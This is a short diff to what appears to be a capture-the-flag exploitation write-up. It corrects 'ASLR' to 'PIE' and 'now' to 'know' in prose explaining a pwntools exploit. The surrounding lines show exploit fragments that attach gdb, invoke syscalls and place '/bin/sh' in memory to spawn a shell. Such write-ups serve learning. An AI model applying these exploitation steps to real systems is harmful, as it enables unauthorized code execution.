@@ -19,7 +19,7 @@ gdb.attach(p,'''
 
 ```
 
-in above code I loaded the elf file and make gdb ready for debugging stuff. then we must create a new mapping in the virtual address space for bypassing ASLR.
+in above code I loaded the elf file and make gdb ready for debugging stuff. then we must create a new mapping in the virtual address space for bypassing the PIE.
 
 ```python
 
@@ -59,7 +59,7 @@ p.sendlineafter('syscall number to call?',str(0))
 p.send(bin_sh)
 ```
 
-now we have "/bin/sh" in the memory and for mmap stuff we now where it's located.
+now we have "/bin/sh" in the memory and for mmap stuff we know where it's located.
 
 ```python
 p.sendlineafter('Do another (0/1)?',str(0x1))
